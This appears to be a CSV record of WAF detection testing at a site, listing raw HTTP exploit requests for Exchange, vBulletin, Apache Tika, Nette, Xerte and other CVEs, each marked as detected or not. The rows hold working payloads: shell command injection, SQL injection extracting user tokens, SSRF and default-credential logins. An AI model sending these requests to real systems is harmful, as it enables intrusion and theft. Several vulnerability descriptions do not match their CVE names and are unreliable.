请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 POST /owa/auth.owa?qhaeshs=7069608564603486209 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 98-r-nqhaeshs: 7069608564603486209-r-nUser-Agent: python-requests/2.23.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ndestination=http%3A%2F%2F1.1.1.5%2Fowa&flags=&username=aestest%40hacker.aeslab&password=user%23123,/owa/auth.owa,7069608564603486209,邮件系统Exchange XML实体注入漏洞（CVE-2020-17143）,"Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。Microsoft Exchange 信息泄露漏洞,目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。以下产品及版本受到影响：Microsoft Exchange Server 2013 Cumulative Update 23,Microsoft Exchange Server 2016 Cumulative Update 18,Microsoft Exchange Server 2019 Cumulative Update 7,Microsoft Exchange Server 2016 Cumulative Update 17,Microsoft Exchange Server 2019 Cumulative Update 6。",未检测
 GET /leaked?%3C!%5BCDATA%5BAESLAB%20TEST%5D%5D%3E&qhaeshs=7069608518902349824 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069608518902349824-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/leaked?%3C!%5BCDATA%5BAESLAB%20TEST%5D%5D%3E,7069608518902349824,邮件系统Exchange XML实体注入漏洞（CVE-2020-17141）,"Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。Microsoft Exchange 远程执行代码漏洞,目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。以下产品及版本受到影响：Microsoft Exchange Server 2016 Cumulative Update 18,Microsoft Exchange Server 2019 Cumulative Update 7,Microsoft Exchange Server 2016 Cumulative Update 17,Microsoft Exchange Server 2019 Cumulative Update 6。",未检测
 GET /actions/async.php?action=stream&source=;id;&qhaeshs=7069608415072354305 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069608415072354305-r-nCache-Control: max-age=0-r-nsec-ch-ua: "Chromium";v="88"， "Google Chrome";v="88"， ";Not A Brand";v="99"-r-nsec-ch-ua-mobile: ?0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/88.0.4324.146 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: none-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate， br-r-nAccept-Language: zh-CN，zh;q=0.9，en-US;q=0.8，en;q=0.7，zh-TW;q=0.6-r-nCookie: PHPSESSID=685eganbtvq7slujn5se9alkp3-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/actions/async.php?action=stream&source=;id;,7069608415072354305,Web组件Klogserver远程命令执行漏洞（CVE-2021-3317）,Nagios XI是美国Nagios公司的一套IT基础设施监控解决方案。该方案支持对应用、服务、操作系统等进行监控和预警。Nagios XI 存在跨站脚本漏洞，该漏洞源于 5.8.4 版本之前的 Nagios XI 中的通用用户界面容易受到经过身份验证的反射跨站点脚本的攻击。 访问特制恶意 URL 的经过身份验证的受害者会在不知不觉中执行附加的有效负载。,未检测
 PUT /meta?qhaeshs=7069608289608138753 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 98-r-nqhaeshs: 7069608289608138753-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Tika-OCRTesseractPath: "cscript"-r-nContent-type: image/jp2-r-nX-Tika-OCRLanguage: //E:Jscript-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/meta,7069608289608138753,Web组件Apache-Tika远程命令执行漏洞（CVE-2018-1335）,TerraMaster TOS是美国铁威马（Terra Master）公司的一套基于Linux平台开发的存储服务器专用操作系统。该系统支持文件共享、云端数据同步、数据备份和虚拟化等功能。TerraMaster TOS 3.1.03版本中的usertable.php文件存在跨站脚本漏洞。远程攻击者可借助‘modgroup’参数利用该漏洞执行JavaScript代码。,未检测
 GET /api/v1/users/admin?fields=*，privileges/PrivilegeInfo/cluster_name，privileges/PrivilegeInfo/permission_name&qhaeshs=7069607654515015681 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607654515015681-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nAuthorization: Basic YWRtaW46YWRtaW4=-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/api/v1/users/admin?fields=*，privileges/PrivilegeInfo/cluster_name，privileges/PrivilegeInfo/permission_name,7069607654515015681,Web组件Apache Ambar弱口令漏洞,Apache Ambari是一种基于Web的工具，支持Apache Hadoop集群的供应、管理和监控。,未检测
 GET /shindig/gadgets/proxy?container=default&url=http://oast.pro&qhaeshs=7069607556347330561 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607556347330561-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: -r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/shindig/gadgets/proxy?container=default&url=http://oast.pro,7069607556347330561,Web应用Shindig服务端请求伪造漏洞,WSO2的应用服务器是一个完全开源的产品。WSO2的Apache软件基金会的Web服务项目，通过领先的开源组件的组合。加上我们自己的整合代码，WSO2公司提供生产质量的开源软件。我们所有的集成代码，包括统一的管理控制台可根据Apache软件许可证2.0版。其存在服务端请求伪造漏洞，滥用 shindig Web 应用程序的 UI 小工具加载功能可以利用此漏洞。攻击者可以更改请求中的特定 URL，从而导致服务器向更改后的 URL 发起 GET 请求。,未检测
 GET /public/index.php/home/file/user_pics?qhaeshs=7069607513041141761 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607513041141761-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/86.0.4240.111 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/public/index.php/home/file/user_pics,7069607513041141761,Web框架Weiphp文件读取漏洞（CNVD-2020-68596）,WeiPHP是一款开源微信公众号平台开发框架。深圳市圆梦云科技有限公司WeiPHP存在文件读取漏洞，攻击者可利用该漏洞获取敏感信息。,检测
 POST /auth/reset-password?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 148-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnew-password=P4%24%24w0rd%21&securitytoken=guest&activationid=14fea72dd6b0b027073366f9c81add31926fc878&userid=1&new-password-confirm=P4%24%24w0rd%21,/auth/reset-password,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /ajax/api/content_infraction/getIndexableContent?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 216-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnodeId%5Bnodeid%5D=1+UNION+SELECT+26%2C25%2C24%2C23%2C22%2C21%2C20%2C19%2C20%2C17%2C16%2C15%2C14%2C13%2C12%2C11%2C10%2Cactivationid%2C8%2C7%2C6%2C5%2C4%2C3%2C2%2C1+from+useractivation+WHERE+userid%3D1+limit+0%2C1--+-,/ajax/api/content_infraction/getIndexableContent,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /auth/lostpw?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 142-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nhumanverify%5Binput%5D=Zn8ANY&humanverify%5Bhash%5D=2668f642d4815ac9b385e24c97400c7f&securitytoken=guest&email=support.combatarms%40valofe.com,/auth/lostpw,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /ajax/api/content_infraction/getIndexableContent?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 196-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnodeId%5Bnodeid%5D=1+UNION+SELECT+26%2C25%2C24%2C23%2C22%2C21%2C20%2C19%2C20%2C17%2C16%2C15%2C14%2C13%2C12%2C11%2C10%2C%28answer%29%2C8%2C7%2C6%2C5%2C4%2C3%2C2%2C1+from+humanverify+limit+0%2C1--+-,/ajax/api/content_infraction/getIndexableContent,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /ajax/api/content_infraction/getIndexableContent?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 201-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnodeId%5Bnodeid%5D=1+UNION+SELECT+26%2C25%2C24%2C23%2C22%2C21%2C20%2C19%2C20%2C17%2C16%2C15%2C14%2C13%2C12%2C11%2C10%2Ccount%28answer%29%2C8%2C7%2C6%2C5%2C4%2C3%2C2%2C1+from+humanverify+limit+0%2C1--+-,/ajax/api/content_infraction/getIndexableContent,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 GET /hv/image?hash=2668f642d4815ac9b385e24c97400c7f&qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/hv/image?hash=2668f642d4815ac9b385e24c97400c7f,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /ajax/api/hv/generateToken?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 19-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nsecuritytoken=guest,/ajax/api/hv/generateToken,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 POST /ajax/api/content_infraction/getIndexableContent?qhaeshs=7069607412201684993 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 256-r-nqhaeshs: 7069607412201684993-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.13.0-r-nX-Requested-With: XMLHttpRequest-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnodeId%5Bnodeid%5D=1+UNION+SELECT+26%2C25%2C24%2C23%2C22%2C21%2C20%2C19%2C20%2C17%2C16%2C15%2C14%2C13%2C12%2C11%2C10%2Cconcat%28username%2C0x7c%2Cuserid%2C0x7c%2Cemail%2C0x7c%2Ctoken%29%2C8%2C7%2C6%2C5%2C4%2C3%2C2%2C1+from+user+where+usergroupid%3D6%3B--+-,/ajax/api/content_infraction/getIndexableContent,7069607412201684993,Web框架Vbulletin SQL 注入漏洞（CVE-2020-12720）,vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。vBulletin 5.5.6pl1之前版本、5.6.0pl1之前的5.6.0版本和5.6.1pl1之前的5.6.1版本中存在安全漏洞，该漏洞源于不正确的访问控制。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。,检测
 GET /lab.html?vpath=//wikipedia.com&qhaeshs=7069607377317658625 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607377317658625-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/lab.html?vpath=//wikipedia.com,7069607377317658625,Web框架Thinfinity服务端请求伪造漏洞（CVE-2021-45092）,Cybele Software Thinfinity VirtualUI是美国Cybele Software公司的一款支持将远程Windows应用程序嵌入到标准Web应用程序中，从而可以与Javascript编程进行双向交互的解决方案。Cybele Software Thinfinity VirtualUI 3.0之前版本存在安全漏洞，攻击者可以通过lab.html中的vpath参数进行IFRAME注入。,未检测
 GET /index.php/nette.micro?callback=shell_exec&cmd=id&qhaeshs=7069607302549995521 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607302549995521-r-nCache-Control: max-age=0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/90.0.4430.212 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8-r-nCookie: nette-browser=6y01o1q8d8; PHPSESSID=6ub9q040nom107mak8rkltave4-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/index.php/nette.micro?callback=shell_exec&cmd=id,7069607302549995521,Web框架Nette远程代码执行漏洞（CVE-2020-15227）,"Nette是个人开发者的一个基于组件的事件驱动 PHP 框架。Nette 存在代码注入漏洞，该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。以下产品及版本受到影响：2.0.19版本, 2.1.13版本, 2.2.10版本, 2.3.14版本, 2.4.16版本, 3.0.6版本。",未检测
 POST /upgrade/haozip/index.php?qhaeshs=7069607153824169985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 336-r-nUser-Agent: python-requests/2.25.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCache-Control: no-cache-r-nContent-Type: application/x-www-form-urlencoded; charset=UTF-8-r-nqhaeshs: 7069607153824169985-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nstat_version=1.0&product=Upgrade_Haozip&main_ver=3.0&version=3.0.0.105&data=SkQFDlRYDl5GWU5GdgkHAgMWDUc0EldLB1UBbS1UXR5YFkRNG3RRAFRSF14VCHMBBwAHXCNadQAndFMAUwYAV3NWVVcOAlIGVVsDU3UbGxByBAdVU0AKG1UfVBxVGwNUBERKQ3gEUAFVQQ9WShUVW11AUgIEEBIDHRMuejdibVQARFw6DGgcHEYQQRZeV1AQCU8VNjU9BAhECz8QVHEBUAVWXyMBcFhxIVQHUgQLBHADBwFSVlEGCF4HU3BHaE8ZOw==,/upgrade/haozip/index.php,7069607153824169985,Web应用Zookeeper越权访问漏洞,ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。存在未授权访问漏洞。,未检测
 POST /www/website_code/php/properties/media_and_quota_template.php?qhaeshs=7069607011909894145 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 14-r-nqhaeshs: 7069607011909894145-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=c7b933cc1e25a3acf4fde44238a5920e-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ntemplate_id=35,/www/website_code/php/properties/media_and_quota_template.php,7069607011909894145,Web应用Xerte目录遍历漏洞（CVE-2021-44665）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在安全漏洞，该漏洞源于当通过download.php下载项目文件时，Xerte项目Xerte到3.10.3存在目录遍历漏洞。,检测
 POST /www/website_code/php/templates/new_template.php?qhaeshs=7069607011909894145 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 77-r-nqhaeshs: 7069607011909894145-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=c7b933cc1e25a3acf4fde44238a5920e-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ntutorialid=Nottingham&templatename=Nottingham&tutorialname=exploit&folder_id=,/www/website_code/php/templates/new_template.php,7069607011909894145,Web应用Xerte目录遍历漏洞（CVE-2021-44665）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在安全漏洞，该漏洞源于当通过download.php下载项目文件时，Xerte项目Xerte到3.10.3存在目录遍历漏洞。,检测
 GET /www/?qhaeshs=7069607011909894145 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607011909894145-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www/,7069607011909894145,Web应用Xerte目录遍历漏洞（CVE-2021-44665）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在安全漏洞，该漏洞源于当通过download.php下载项目文件时，Xerte项目Xerte到3.10.3存在目录遍历漏洞。,检测
 GET /www?qhaeshs=7069607011909894145 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069607011909894145-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www,7069607011909894145,Web应用Xerte目录遍历漏洞（CVE-2021-44665）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在安全漏洞，该漏洞源于当通过download.php下载项目文件时，Xerte项目Xerte到3.10.3存在目录遍历漏洞。,检测
 GET /www/?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=8d943d18dc7b936b99bb7c5cf08e5a3b-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www/,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
 GET /www?qhaeshs=7069606864417193985 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069606864417193985-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，*/*;q=0.8-r-nCookie: PHPSESSID=8d943d18dc7b936b99bb7c5cf08e5a3b-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/www,7069606864417193985,Web应用Xerte远程代码执行漏洞（CVE-2021-44664）,Xerte是英国The Xerte Project社区的一个开源软件。用于创作学习对象。Xerte存在代码问题漏洞，该漏洞通过伪装成语言文件的项目接口上传一个恶意制作的php文件，以绕过上传过滤器。攻击者可利用该漏洞可以通过滥用“mediapath”变量中的路径遍历来操纵文件的目的地。,未检测
